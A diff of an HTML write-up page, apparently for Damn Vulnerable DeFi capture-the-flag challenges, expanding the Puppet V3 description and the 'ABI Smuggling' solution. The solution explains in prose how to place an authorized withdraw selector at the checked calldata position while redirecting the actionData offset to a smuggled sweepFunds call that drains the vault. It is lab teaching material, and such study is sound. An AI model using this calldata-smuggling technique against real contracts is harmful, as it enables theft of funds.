+                        <li><b>borrow()</b> allows borrowing <code>borrowAmount</code> of tokens by first depositing
+                            three times their
+                            value in WETH. Sender must have approved enough WETH in advance. Calculations assume that
+                            WETH and the
+                            borrowed token have the same number of decimals.</li>
+                        <li><b>calculateDepositOfWETHRequired()</b> returns the amount of WETH we have to deposit to get
+                            the DVT tokens
+                            for borrowing.</li>
+                        <li><b>_getOracleQuote()</b> gets the quote amount from the <b>Uniswap-v3 oracle library</b>.
+                        </li>
                     </ul>
 
                     <span class="levelBox">puppet-v3.challenge.js (excerpt)</span>
@@ -1253,6 +2062,8 @@ contract AttackTimelock {
                     <div class="repo"><span>$ yarn run puppet-v3</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 15 — ABI SMUGGLING ============ -->
                 <section id="c15" class="challenge">
                     <h4><span class="num">15</span> ABI Smuggling</h4>
@@ -1266,20 +2077,68 @@ contract AttackTimelock {
 
                     <h5>Goal</h5>
                     <ul>
-                        <li>A permissioned vault holds 1 million DVT, with a generic authorization scheme. A disclosure
-                            says all funds can be stolen — rescue them to the recovery account.</li>
+                        <li>There's a permissioned vault with 1 million DVT tokens deposited. The vault allows
+                            withdrawing funds
+                            periodically, as well as taking all funds out in case of emergencies.</li>
+                        <li>The contract has an embedded generic authorization scheme, only allowing known accounts to
+                            execute specific
+                            actions.</li>
+                        <li>The dev team has received a responsible disclosure saying all funds can be stolen.</li>
+                        <li>Before it's too late, rescue all funds from the vault, transferring them back to the
+                            recovery account.</li>
                     </ul>
 
                     <h5>Solution</h5>
                     <ul>
+                        <li>Exploring the contracts:
+                            <ul>
+                                <li><b>AuthorizedExecutor.sol</b>: It is an abstract contract which executes the
+                                    functions using low
+                                    level calls.</li>
+                                <li><b>SelfAuthorizedVault.sol</b>: Contract which has 1 Million DVT tokens locked in
+                                    contract.</li>
+                            </ul>
+                        </li>
+                        <li>Here we call <b>execute()</b> function and passing target as <b>SelfAuthorizedVault</b>
+                            contract address and
+                            inside the data parameter we call <b>sweepFunds()</b> to recover all the DVT tokens inside
+                            the
+                            <b>SelfAuthorizedVault contract.</b>
+                        </li>
+                        <li>Before executing the transaction we have to <b>setPermissions()</b> for sweepFunds(), caller
+                            and
+                            SelfAuthorizedVault address. Here setPermissions() can be called by anyone as it is an
+                            <b>external</b>
+                            function.
+                        </li>
+                        <li>When having dynamically-allocated types, you need to specify the size, length, or quantity
+                            (in a 32 bytes
+                            segment) of the expected elements to let the contract know up to what point extends a
+                            structure. And
+                            immediately afterward comes the content.</li>
+                        <li>Now, the position of that combination (size, content) is not arbitrary. It is previously
+                            defined by a 32
+                            bytes segment that contains its offset (in bytes).</li>
                         <li><b>execute()</b> verifies a 4-byte selector at a <i>fixed</i> calldata position (bytes 100),
-                            but the <code>actionData</code> offset is attacker-controlled.</li>
+                            but the
+                            <code>actionData</code> offset is attacker-controlled.
+                        </li>
                         <li>Keep an authorized selector (withdraw's <code>0xd9caed12</code>) at the checked position,
-                            then point <code>actionData</code> to a separately-crafted region holding the real
-                            <b>sweepFunds()</b> call.
+                            then point
+                            <code>actionData</code> to a separately-crafted region holding the real <b>sweepFunds()</b>
+                            call.
                         </li>
                         <li>The permission check passes on the decoy selector while <b>sweepFunds()</b> gets smuggled
-                            and executed, draining the vault to recovery.</li>
+                            and executed,
+                            draining the vault to recovery.</li>
+                        <li>Have the following 4 bytes after 100th position (4 + 32 * 3) occupied with a function
+                            selector authorized
+                            for the caller. In our case, player is authorized to use withdraw.</li>
+                        <li>Immediately afterward, actionData's size and content, containing the working calldata
+                            (sweepFunds) to drain
+                            the vault to the recovery address.</li>
+                        <li>Point actionData's beginning to the new position. Fill the freed space in between with
+                            zeroes.</li>
                     </ul>
 
                     <div class="repo">
